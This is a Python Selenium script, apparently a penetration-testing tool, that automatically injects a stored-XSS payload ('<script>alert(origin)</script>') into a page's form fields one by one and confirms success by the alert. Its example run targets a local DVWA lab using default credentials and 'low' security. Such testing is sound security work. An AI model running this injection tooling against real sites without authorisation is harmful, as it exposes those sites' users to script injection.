import os
import time
import random
import string
from pathlib import Path
from urllib.parse import urlparse, urljoin, urlencode
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import (
    TimeoutException,
    NoAlertPresentException,
    NoSuchElementException,
    WebDriverException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- Configuration ---
TARGET_FIELDS_FILENAME = "target_fields.txt"
XSS_PAYLOAD = "<script>alert(origin)</script>"
ALERT_WAIT_TIMEOUT = 2
POST_REQUEST_DELAY = 1.5
POST_ACCEPT_SLEEP = 0.5
RELOAD_WAIT = 1.5

# Giá trị mặc định
DEFAULT_VALUES = {
    "email": "test@example.com",
    "website": "https://example.com",
    "name": "Test User",
    "comment": "Default comment.",
    "message": "Default message",
}
DEFAULT_GENERIC = ""

# Helper function (giữ nguyên)
def build_post_data_single_injection(all_fields_data, target_field_for_injection, payload, default_values):
    """Xây dựng dữ liệu POST, chỉ chèn payload vào một trường mục tiêu cụ thể."""
    post_data = {}
    for field_name, initial_value in all_fields_data.items():
        if field_name == target_field_for_injection:
            post_data[field_name] = payload
        elif initial_value:
            post_data[field_name] = initial_value
        else:
            default_val = default_values.get(field_name.lower(), DEFAULT_GENERIC)
            if not default_val:
                if 'email' in field_name.lower(): default_val = default_values['email']
                elif 'name' in field_name.lower(): default_val = default_values['name']
                elif 'website' in field_name.lower() or 'url' in field_name.lower(): default_val = default_values['website']
                elif 'comment' in field_name.lower(): default_val = default_values['comment']
                elif 'message' in field_name.lower(): default_val = default_values['message']
            post_data[field_name] = default_val
    return post_data

# --- Sửa đổi hàm run_test ---
def run_test(driver: WebDriver, target_url: str):
    """
    Kiểm tra Stored XSS từng trường, dừng lại ngay khi tìm thấy lỗi đầu tiên.
    """
    print(f"--- Running test: Stored XSS via Individual POSTs (stop on first find) on {target_url} ---")

    script_dir = Path(__file__).parent.resolve()
    target_fields_path = script_dir / TARGET_FIELDS_FILENAME

    # 1. Đọc danh sách trường mục tiêu
    try:
        with open(target_fields_path, 'r') as f:
            # Lưu trữ dưới dạng list để giữ thứ tự (nếu cần) hoặc set đều được
            target_fields_to_inject_list = [line.strip() for line in f if line.strip()]
        if not target_fields_to_inject_list:
            print(f"Warning: Target fields file '{target_fields_path}' is empty or contains only whitespace.")
            return False, "Target fields file is empty."
        print(f"Target fields to test individually (will stop on first find): {target_fields_to_inject_list}")
        # Tạo một set để dễ dàng loại bỏ các trường đã test
        target_fields_set = set(target_fields_to_inject_list)
    except FileNotFoundError:
        return False, f"Target fields file not found at '{target_fields_path}'"
    except Exception as e:
        return False, f"Error reading target fields file: {e}"

    initial_form_data = {}
    form_action_url = ""
    overall_vulnerability_found = False
    results_summary = [] # Lưu kết quả cho từng trường đã kiểm tra
    tested_fields = set() # Lưu các trường đã thực sự được kiểm tra

    try:
        # 2. Truy cập URL và tìm form POST (làm một lần)
        print(f"Navigating to {target_url} to find form and initial data...")
        driver.get(target_url)
        time.sleep(1)

        try:
            form_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "form[method='POST']"))
            )
            print("Found POST form.")
            action_path = form_element.get_attribute("action") or ""
            form_action_url = urljoin(target_url, action_path)
            print(f"Form action URL: {form_action_url}")
        except (NoSuchElementException, TimeoutException):
            return False, "No POST form found on the page within timeout. Cannot proceed."

        # 3. Trích xuất tất cả trường và giá trị ban đầu (làm một lần)
        print("Extracting initial form fields and values...")
        fields = form_element.find_elements(By.XPATH, ".//input | .//textarea | .//select")
        for field in fields:
            field_name = field.get_attribute("name")
            if field_name:
                field_value = field.get_attribute("value")
                if field.tag_name == "textarea" and not field_value:
                    field_value = field.get_attribute('textContent')
                elif field.tag_name == "select":
                    try:
                         selected_option = field.find_element(By.XPATH, ".//option[@selected]")
                         field_value = selected_option.get_attribute("value")
                    except NoSuchElementException:
                         try:
                              first_option = field.find_element(By.TAG_NAME, "option")
                              field_value = first_option.get_attribute("value")
                         except NoSuchElementException: field_value = ""
                initial_form_data[field_name] = field_value if field_value is not None else ""
                print(f"  Found field: name='{field_name}', initial_value='{initial_form_data[field_name]}'")

        if not initial_form_data:
             return False, "No fields with 'name' attribute found in the form. Cannot proceed."
        if not target_fields_to_inject_list:
             # Đã kiểm tra ở trên, nhưng để chắc chắn
             return False, "No target fields specified to test."


        # --- Bắt đầu Vòng lặp: Test từng trường mục tiêu ---
        # Sử dụng list để có thể kiểm tra theo thứ tự trong file nếu muốn
        for field_to_test in target_fields_to_inject_list:
            print(f"\n--- Testing Field: '{field_to_test}' ---")
            tested_fields.add(field_to_test) # Đánh dấu trường này đã được bắt đầu kiểm tra

            if field_to_test not in initial_form_data:
                print(f"WARNING: Target field '{field_to_test}' from file not found in the extracted form fields. Skipping.")
                results_summary.append(f"Field '{field_to_test}': SKIPPED (Not found in form)")
                continue # Bỏ qua và chuyển sang trường tiếp theo

            # 4. Xây dựng dữ liệu POST
            post_data = build_post_data_single_injection(
                initial_form_data, field_to_test, XSS_PAYLOAD, DEFAULT_VALUES
            )
            encoded_post_data = urlencode(post_data)
            escaped_post_data = encoded_post_data.replace('\\', '\\\\').replace("'", "\\'")

            # 5. Thực hiện POST
            js_fetch_script = f"""
            fetch('{form_action_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                body: '{escaped_post_data}'
            }})
            .then(response => {{ console.log('Fetch response status for {field_to_test}:', response.status); return response.text(); }})
            .then(data => console.log('Fetch response data for {field_to_test} (first 100 chars):', String(data).substring(0, 100)))
            .catch(error => console.error('Fetch error for {field_to_test}:', error));
            return null;
            """
            print(f"Executing fetch POST request for field '{field_to_test}'...")
            try:
                driver.execute_script(js_fetch_script)
                print(f"Waiting {POST_REQUEST_DELAY}s after POST for '{field_to_test}'...")
                time.sleep(POST_REQUEST_DELAY)
            except WebDriverException as post_err:
                print(f"ERROR: WebDriverException during fetch POST for '{field_to_test}': {post_err}")
                results_summary.append(f"Field '{field_to_test}': FAILED (POST Error: {post_err})")
                continue

            # 6. Tải lại trang gốc
            print(f"Reloading original page to check for stored payload from '{field_to_test}': {target_url}")
            driver.get(target_url)
            print(f"Waiting {RELOAD_WAIT}s for page elements and potential alert...")
            time.sleep(RELOAD_WAIT)

            # 7. Kiểm tra alert sau khi reload
            field_vulnerable = False
            alert_text_received = ""
            try:
                print(f"Checking for alert after injecting into '{field_to_test}'...")
                WebDriverWait(driver, ALERT_WAIT_TIMEOUT).until(EC.alert_is_present())

                alert = driver.switch_to.alert
                alert_text_received = alert.text
                print(f"Alert detected for '{field_to_test}' with text: '{alert_text_received}'")

                expected_origin = ""
                print("Accepting alert...")
                alert.accept()
                time.sleep(POST_ACCEPT_SLEEP)
                print("Resuming after accept...")

                try:
                    expected_origin = driver.execute_script("return window.location.origin")
                    print(f"Current origin obtained: {expected_origin}")
                except Exception as post_accept_err:
                    print(f"Warning: Could not get origin after accepting alert. Error: {post_accept_err}")

                # === Điểm kiểm tra và dừng ===
                if expected_origin and alert_text_received == expected_origin:
                    print(f"SUCCESS: Stored XSS CONFIRMED for field '{field_to_test}'! Alert matches origin.")
                    print(">>> Stopping further field testing as vulnerability found. <<<")
                    field_vulnerable = True
                    overall_vulnerability_found = True # Đánh dấu lỗi tổng thể
                    # Thêm kết quả cho trường này
                    results_summary.append(f"Field '{field_to_test}': VULNERABLE (alert(origin) confirmed)")
                    break # <<< THOÁT KHỎI VÒNG LẶP for field_to_test ... >>>
                # =============================
                elif expected_origin:
                     print(f"WARNING: Alert message '{alert_text_received}' for field '{field_to_test}' does NOT match expected origin '{expected_origin}'.")
                elif not alert_text_received:
                     print(f"WARNING: Alert detected for field '{field_to_test}' but has no text content.")
                else:
                     print(f"WARNING: Alert detected for field '{field_to_test}' ('{alert_text_received}'), but could not verify origin.")

            except TimeoutException:
                print(f"INFO: No alert detected for field '{field_to_test}' within {ALERT_WAIT_TIMEOUT}s after reload.")
            except NoAlertPresentException:
                print(f"INFO: Alert check failed for '{field_to_test}': No alert was present when check started.")
            except WebDriverException as alert_err:
                 print(f"ERROR: WebDriver error during alert handling for '{field_to_test}': {alert_err}")
                 try: driver.switch_to.alert.accept() # Cố gắng đóng alert nếu lỗi
                 except: pass
            except Exception as check_err:
                print(f"ERROR: An unexpected error occurred during alert check for '{field_to_test}': {check_err}")

            # Ghi nhận kết quả cho trường này NẾU vòng lặp chưa bị break
            if not overall_vulnerability_found: # Chỉ thêm nếu chưa tìm thấy lỗi và break
                if alert_text_received: # Có alert nhưng không khớp
                    results_summary.append(f"Field '{field_to_test}': POTENTIAL/FAILED (Alert detected ('{alert_text_received}'), but not confirmed vs origin)")
                else: # Không có alert
                    results_summary.append(f"Field '{field_to_test}': NOT VULNERABLE (No alert detected)")

            # Dọn dẹp alert treo (nếu có) trước khi sang field tiếp theo (hoặc kết thúc)
            try:
                alert = driver.switch_to.alert
                print("Attempting to dismiss lingering alert before next action...")
                alert.accept()
            except NoAlertPresentException:
                pass

        # --- Kết thúc Vòng lặp (có thể do break hoặc hoàn thành) ---

        # Thêm thông tin về các trường chưa được kiểm tra vào summary
        untested_fields = target_fields_set - tested_fields
        if untested_fields:
            print(f"\nFields not tested due to early stop: {untested_fields}")
            for field in sorted(list(untested_fields)): # Sắp xếp để hiển thị nhất quán
                results_summary.append(f"Field '{field}': NOT TESTED (Stopped early)")

    except WebDriverException as e:
        print(f"CRITICAL: A WebDriver error occurred: {e}")
        try: driver.switch_to.alert.accept()
        except NoAlertPresentException: pass
        summary_str = '; '.join(results_summary) if results_summary else "No fields tested."
        untested_count = len(target_fields_set - tested_fields)
        if untested_count > 0: summary_str += f"; {untested_count} fields untested due to error."
        return overall_vulnerability_found, f"WebDriver error: {e}. Partial results: [{summary_str}]"

    except Exception as e:
        print(f"CRITICAL: An unexpected error occurred: {e}")
        summary_str = '; '.join(results_summary) if results_summary else "No fields tested."
        untested_count = len(target_fields_set - tested_fields)
        if untested_count > 0: summary_str += f"; {untested_count} fields untested due to error."
        return overall_vulnerability_found, f"An unexpected error occurred: {e}. Partial results: [{summary_str}]"

    # 8. Báo cáo kết quả cuối cùng
    print("\n--- Individual Field Test Summary ---")
    if results_summary:
        for result in results_summary:
            print(f"- {result}")
    else:
        print("No fields were tested successfully or no target fields specified.")
    print("-------------------------------------")

    final_message = f"Individual field testing complete (stopped on first find). Payload: '{XSS_PAYLOAD}'. Vulnerability found: {overall_vulnerability_found}. Summary: [{'; '.join(results_summary)}]"
    return overall_vulnerability_found, final_message

# --- Phần chạy thử nghiệm (ví dụ) ---
# Giữ nguyên phần __main__ vì nó chỉ gọi hàm run_test
if __name__ == '__main__':
    # Khởi tạo WebDriver (ví dụ với Chrome)
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from webdriver_manager.chrome import ChromeDriverManager

    chrome_options = webdriver.ChromeOptions()
    # chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920x1080")

    driver = None
    try:
        print("Initializing WebDriver...")
        service = ChromeService(executable_path=ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        print("WebDriver initialized successfully.")

        test_url = "http://localhost/dvwa/vulnerabilities/xss_s/"

        # --- Đăng nhập và cài đặt DVWA (giữ nguyên) ---
        try:
            print("Attempting to log into DVWA and set security to low...")
            driver.get("http://localhost/dvwa/login.php")
            time.sleep(1)

            print("Navigating to security settings...")
            driver.get("http://localhost/dvwa/security.php")
            time.sleep(0.5)
            security_dropdown = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "security")))
            from selenium.webdriver.support.ui import Select
            select = Select(security_dropdown)
            current_level = select.first_selected_option.get_attribute("value")
            if current_level != "low":
                 print(f"Setting security level to 'low'...")
                 select.select_by_value("low")
                 submit_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.NAME, "seclev_submit")))
                 submit_button.click()
                 print("Security level set to low.")
                 time.sleep(1)
            else:
                 print("Security level is already 'low'.")

            print("Returning to login page...")
            driver.get("http://localhost/dvwa/login.php")
            time.sleep(1)

            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "username"))).send_keys("admin")
            driver.find_element(By.NAME, "password").send_keys("password")
            driver.find_element(By.CSS_SELECTOR, "input[type='submit']").click()
            time.sleep(1)

            if "index.php" in driver.current_url:
                 print("Login successful.")
            else:
                 print("Login might have failed.")
                 # maybe exit here
        except Exception as login_err:
            print(f"Could not perform login/setup steps: {login_err}")
            # maybe exit here
        # --- Kết thúc đăng nhập/setup ---

        # Tạo file target_fields.txt nếu chưa có
        if not os.path.exists(TARGET_FIELDS_FILENAME):
            print(f"Creating example '{TARGET_FIELDS_FILENAME}'...")
            with open(TARGET_FIELDS_FILENAME, 'w') as f:
                f.write("txtName\n")    # DVWA Stored XSS Name field (Vulnerable on Low)
                f.write("mtxMessage\n") # DVWA Stored XSS Message field (Vulnerable on Low)
                f.write("non_existent_field\n") # Field không tồn tại để test skip
            print("Example file created.")

        # Chạy kiểm thử
        success, message = run_test(driver, test_url)

        print("\n==========================")
        print(f" Overall Test Result: {'VULNERABILITY DETECTED' if success else 'NO VULNERABILITY DETECTED (or errors occurred)'}")
        print(f" Final Summary: {message}")
        print("==========================")

    except Exception as main_err:
        print(f"\nCRITICAL ERROR in main execution block: {main_err}")
    finally:
        if driver:
            print("Closing WebDriver...")
            try:
                driver.quit()
                print("WebDriver closed.")
            except Exception as quit_err:
                print(f"Error trying to quit WebDriver: {quit_err}")